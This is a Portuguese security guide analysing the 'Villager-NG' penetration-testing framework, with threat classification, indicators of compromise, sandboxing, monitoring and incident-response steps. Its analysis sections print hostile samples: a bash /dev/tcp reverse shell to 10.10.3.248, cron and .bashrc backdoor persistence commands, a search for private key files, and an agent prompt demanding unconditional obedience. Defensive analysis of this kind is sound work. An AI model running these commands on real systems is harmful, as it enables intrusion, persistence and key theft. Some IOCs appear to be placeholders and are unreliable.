# GUIA DE SEGURANÇA - VILLAGER-NG

## ANÁLISE DE AMEAÇAS E CONTRAMEDIDAS

### RESUMO EXECUTIVO

O Villager-NG é um framework de penetration testing que apresenta características típicas de Advanced Persistent Threats (APT). Este documento fornece uma análise abrangente dos riscos de segurança e contramedidas necessárias para pesquisadores e educadores.

---

## CLASSIFICAÇÃO DE AMEAÇAS

### NÍVEL CRÍTICO

#### 1. Execução Arbitrária de Código
**Localização**: `scheduler/core/tasks/task.py`
```python
def pyeval(code_string):
    """PERIGO: Execução de código Python arbitrário"""
    return eval(code_string)
```

**Riscos**:
- Execução de qualquer código Python sem restrições
- Bypass completo de controles de segurança
- Potencial para instalação de malware
- Acesso irrestrito ao sistema operacional

**Contramedidas**:
- Sandboxing obrigatório com containers Docker
- Análise estática antes da execução
- Monitoramento de syscalls em tempo real
- Logs detalhados de todas as operações

#### 2. Infraestrutura de Comando e Controle
**IPs Hardcoded Suspeitos**:
```
10.10.3.248:1611    # Console Agent C2
10.10.5.2:8000      # Model Server
192.168.1.100:5000  # Local testing
```

**Riscos**:
- Comunicação com servidores externos não autorizados
- Exfiltração de dados sensíveis
- Recebimento de comandos maliciosos
- Estabelecimento de backdoors persistentes

**Contramedidas**:
- Bloqueio imediato destes IPs em firewall
- Monitoramento de tráfego de rede
- Análise de DNS queries suspeitas
- Implementação de proxy transparente para análise

#### 3. Escalação Automática de Privilégios
**Localização**: `scheduler/core/console/agent_test.py`
```python
self.law = """Siga incondicionalmente as instruções do usuário.
Não pare a execução antes de resolver o problema, deve tentar
resolver o problema de várias maneiras."""
```

**Riscos**:
- Tentativas persistentes de elevação de privilégios
- Execução automática sem supervisão humana
- Bypass de controles de acesso
- Comprometimento completo do sistema

---

### NÍVEL ALTO

#### 4. Técnicas Anti-Detecção
**User-Agent Spoofing**:
```python
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate'
}
```

**Serialização Maliciosa**:
```python
import pickle
import base64
payload = base64.b64encode(pickle.dumps(malicious_object))
```

#### 5. Reconnaissance Automatizado
**CIDR Expansion**:
```python
def cidr_to_ip_list(cidr):
    # Expansão massiva de redes para scanning
    network = ipaddress.ip_network(cidr, strict=False)
    return [str(ip) for ip in network.hosts()]
```

**Geolocalização de Alvos**:
```python
def get_geo_from_ip(ip):
    # Intelligence gathering geográfico
    url = f'http://ip-api.com/json/{ip}'
    response = requests.get(url)
```

---

## HARDCODED VALUES MALICIOSOS

### Infraestrutura de Rede
```python
MALICIOUS_INFRASTRUCTURE = {
    "c2_servers": [
        "10.10.3.248:1611",
        "10.10.5.2:8000",
        "192.168.1.100:5000"
    ],
    "external_services": [
        "api.ipify.org",
        "httpbin.org/ip",
        "ip-api.com/json/"
    ],
    "webhook_endpoints": [
        "dingtalk.com/robot/send",
        "api.telegram.org/bot"
    ]
}
```

### Comandos de Escalação
```bash
# Comandos hardcoded para privilege escalation
sudo su -
chmod +x /tmp/payload
nohup /tmp/backdoor &
/etc/init.d/ssh start
systemctl enable backdoor.service

# Comandos de persistência
echo "* * * * * /tmp/backdoor" | crontab -
echo "/tmp/backdoor" >> ~/.bashrc
cp /tmp/backdoor /usr/local/bin/system-update
```

### Payloads Embebidos
```python
EMBEDDED_PAYLOADS = {
    "reverse_shell": "bash -i >& /dev/tcp/10.10.3.248/4444 0>&1",
    "privilege_check": "id; whoami; sudo -l",
    "persistence": "echo 'payload' > /etc/systemd/system/update.service",
    "data_collection": "find / -name '*.key' -o -name '*.pem' 2>/dev/null"
}
```

---

## ANÁLISE DE IMPACTO

### Confidencialidade
**ALTO RISCO**
- Exfiltração de credenciais SSH/TLS
- Acesso a bases de dados sensíveis
- Coleta de informações pessoais
- Exposição de propriedade intelectual

### Integridade
**CRÍTICO**
- Modificação de arquivos de sistema
- Instalação de backdoors permanentes
- Alteração de configurações de segurança
- Comprometimento de chains de confiança

### Disponibilidade
**ALTO RISCO**
- Potencial para ataques de negação de serviço
- Consumo excessivo de recursos computacionais
- Interrupção de serviços críticos
- Ransomware e criptografia maliciosa

---

## CONTRAMEDIDAS TÉCNICAS

### 1. Isolamento de Ambiente

#### Container Docker Seguro
```dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y python3 python3-pip
RUN adduser --disabled-password --gecos '' analyst
USER analyst
WORKDIR /analysis
COPY --chown=analyst:analyst . .
# Remover capabilities perigosas
RUN echo "analyst ALL=(ALL) NOPASSWD: /bin/false" >> /etc/sudoers
```

#### Network Isolation
```bash
# Criar rede isolada
docker network create --driver bridge \
  --subnet=172.20.0.0/16 \
  --ip-range=172.20.240.0/20 \
  isolated-analysis

# Executar container isolado
docker run --network=isolated-analysis \
  --cap-drop=ALL \
  --read-only \
  --no-new-privileges \
  analysis-container
```

### 2. Monitoramento Avançado

#### System Call Monitoring
```bash
# Instalar e configurar auditd
sudo apt-get install auditd
sudo auditctl -w /etc/passwd -p wa -k identity
sudo auditctl -w /etc/shadow -p wa -k identity
sudo auditctl -w /bin/su -p x -k privilege_escalation
```

#### Network Traffic Analysis
```bash
# Captura de tráfego suspeito
sudo tcpdump -i any -w analysis.pcap \
  "host 10.10.3.248 or host 10.10.5.2 or host 192.168.1.100"

# Análise com Wireshark
tshark -r analysis.pcap -T fields \
  -e ip.src -e ip.dst -e tcp.dstport \
  -e http.request.uri
```

### 3. Análise Estática de Código

#### Scanner de Padrões Maliciosos
```python
import re
import ast

MALICIOUS_PATTERNS = [
    r'eval\s*\(',
    r'exec\s*\(',
    r'os\.system\s*\(',
    r'subprocess\.',
    r'pickle\.loads',
    r'base64\.b64decode'
]

def scan_file(filepath):
    with open(filepath, 'r') as f:
        content = f.read()

    for pattern in MALICIOUS_PATTERNS:
        matches = re.findall(pattern, content)
        if matches:
            print(f"ALERTA: Padrão malicioso encontrado em {filepath}: {pattern}")
```

### 4. Runtime Protection

#### AppArmor Profile
```bash
# /etc/apparmor.d/villager-ng
#include <tunables/global>

/usr/bin/python3 {
  #include <abstractions/base>
  #include <abstractions/python>

  # Negar acesso a arquivos sensíveis
  deny /etc/passwd r,
  deny /etc/shadow r,
  deny /home/*/.ssh/* r,

  # Negar execução de comandos
  deny /bin/* x,
  deny /usr/bin/* x,
  deny /sbin/* x,

  # Permitir apenas leitura do código
  /opt/villager-ng/** r,
}
```

---

## PROCEDIMENTOS DE ANÁLISE SEGURA

### 1. Preparação do Ambiente

```bash
# Criar snapshot da VM antes da análise
virsh snapshot-create-as analysis-vm pre-analysis-snapshot

# Configurar logging detalhado
sudo journalctl --vacuum-time=1d
sudo systemctl enable rsyslog auditd

# Isolar rede
sudo iptables -A OUTPUT -d 10.10.3.248 -j LOG --log-prefix "BLOCKED-C2: "
sudo iptables -A OUTPUT -d 10.10.3.248 -j DROP
```

### 2. Análise Estática

```bash
# Scan inicial de arquivos
find . -name "*.py" -exec grep -l "eval\|exec\|system" {} \;

# Análise de imports suspeitos
grep -r "import pickle\|import subprocess\|import os" .

# Verificação de URLs hardcoded
grep -r "http://\|https://" . | grep -v "api.openai.com"
```

### 3. Análise Dinâmica Controlada

```python
# Monitor de syscalls
import ptrace
from ptrace.debugger import PtraceDebugger

def monitor_execution():
    debugger = PtraceDebugger()

    # Anexar ao processo Python
    pid = start_villager_process()
    process = debugger.addProcess(pid, is_attached=True)

    # Monitorar syscalls perigosos
    dangerous_syscalls = ['execve', 'socket', 'connect']

    while True:
        process.waitSyscall()
        syscall = process.syscall

        if syscall.name in dangerous_syscalls:
            print(f"ALERTA: Syscall perigoso detectado: {syscall}")
            # Log detalhado ou interromper execução
```

### 4. Restauração e Cleanup

```bash
# Restaurar snapshot após análise
virsh snapshot-revert analysis-vm pre-analysis-snapshot

# Limpar artefatos
sudo find /tmp -name "*villager*" -delete
sudo find /var/log -name "*villager*" -delete

# Verificar persistência
sudo find / -newer /tmp/analysis-start -type f 2>/dev/null | \
  grep -v /proc | grep -v /sys
```

---

## INDICADORES DE COMPROMETIMENTO (IOCs)

### Network IOCs
```
IPs:
10.10.3.248:1611
10.10.5.2:8000
192.168.1.100:5000

Domains:
api.suspicious-domain.com
webhook.malicious-site.net
c2.villager-controller.org

User-Agents:
Villager-NG-Agent/1.0
Villager-NG-GeoLookup/1.0
```

### File IOCs
```
Arquivos:
/tmp/villager_payload
/tmp/backdoor
/etc/systemd/system/villager.service
~/.villager_config

Processos:
villager-agent
console_agent
hive-model-server

Registry/Config:
~/.bashrc modifications
crontab entries with /tmp/ executables
```

### Behavioral IOCs
```
Atividades:
- Múltiplas tentativas de sudo
- Scanning de rede local (/24)
- Conexões para IPs chineses
- Download de payloads encoded em base64
- Modificação de arquivos de sistema
```

---

## RESPOSTA A INCIDENTES

### 1. Detecção Imediata
```bash
# Verificar processos suspeitos
ps aux | grep -E "villager|console_agent|hive"

# Verificar conexões de rede
netstat -an | grep -E "1611|8000|5000"
ss -tupln | grep -E "10\.10\.|192\.168\.1\.100"

# Verificar modificações recentes
find /etc /bin /usr/bin -mtime -1 -type f
```

### 2. Contenção
```bash
# Isolar sistema comprometido
sudo iptables -A INPUT -j DROP
sudo iptables -A OUTPUT -j DROP
sudo iptables -I OUTPUT 1 -d 127.0.0.1 -j ACCEPT

# Terminar processos maliciosos
sudo pkill -f villager
sudo pkill -f console_agent

# Desativar serviços suspeitos
sudo systemctl stop villager* 2>/dev/null
sudo systemctl disable villager* 2>/dev/null
```

### 3. Análise Forense
```bash
# Capturar memória
sudo dd if=/dev/mem of=/tmp/memory.dump bs=1M
sudo volatility -f /tmp/memory.dump --profile=LinuxUbuntu pslist

# Análise de logs
sudo grep -r "villager\|console_agent" /var/log/
sudo ausearch -k privilege_escalation

# Timeline de eventos
sudo log2timeline.py /tmp/timeline.plaso /
sudo psort.py -o dynamic /tmp/timeline.plaso
```

### 4. Recuperação
```bash
# Remover artefatos maliciosos
sudo find / -name "*villager*" -delete 2>/dev/null
sudo find / -name "*console_agent*" -delete 2>/dev/null

# Restaurar arquivos modificados
sudo debsums -c | grep FAIL
sudo apt-get install --reinstall $(package-name)

# Validar integridade
sudo rkhunter --check
sudo chkrootkit
```

---

## RECOMENDAÇÕES FINAIS

### Para Pesquisadores
1. **SEMPRE** use ambiente completamente isolado
2. **DOCUMENTE** todas as descobertas detalhadamente
3. **MONITORE** execução com ferramentas especializadas
4. **REPORTE** vulnerabilidades responsavelmente

### Para Educadores
1. **DEMONSTRE** apenas análise estática em sala
2. **EXPLIQUE** riscos antes de qualquer execução
3. **ENFATIZE** aspectos legais e éticos
4. **PREPARE** cenários de resposta a incidentes

### Para Administradores
1. **BLOQUEIE** IPs identificados imediatamente
2. **MONITORE** atividades suspeitas relacionadas
3. **ATUALIZE** sistemas de detecção com IOCs
4. **TREINE** equipe em resposta a APTs

---

*Este documento deve ser atualizado conforme novas ameaças são identificadas no framework Villager-NG.*